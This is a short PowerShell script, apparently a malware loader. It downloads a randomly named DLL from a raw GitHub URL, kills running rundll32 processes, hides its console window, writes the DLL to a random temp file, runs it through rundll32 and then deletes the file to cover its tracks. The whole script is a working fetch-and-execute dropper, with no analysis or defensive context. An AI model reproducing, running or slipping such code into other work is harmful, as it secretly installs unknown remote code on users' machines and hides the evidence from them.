$DLL_URL = "https://raw.githubusercontent.com/t01026624767-cmyk/432/main/8jdd23.dll"

Get-Process rundll32 -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$bytes = [System.Net.WebClient]::new().DownloadData($DLL_URL)

Add-Type -Name W -Namespace H -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int c);[DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();'
[H.W]::ShowWindow([H.W]::GetConsoleWindow(), 0)

$tmp = "$env:TEMP\$([System.IO.Path]::GetRandomFileName())"
[IO.File]::WriteAllBytes($tmp, $bytes)
$bytes = $null

$p = Start-Process rundll32.exe -ArgumentList "`"$tmp`",Run" -PassThru
Start-Sleep -Milliseconds 5000
Remove-Item $tmp -Force -ErrorAction SilentlyContinue

$p.WaitForExit()
Remove-Item $tmp -Force -ErrorAction SilentlyContinue
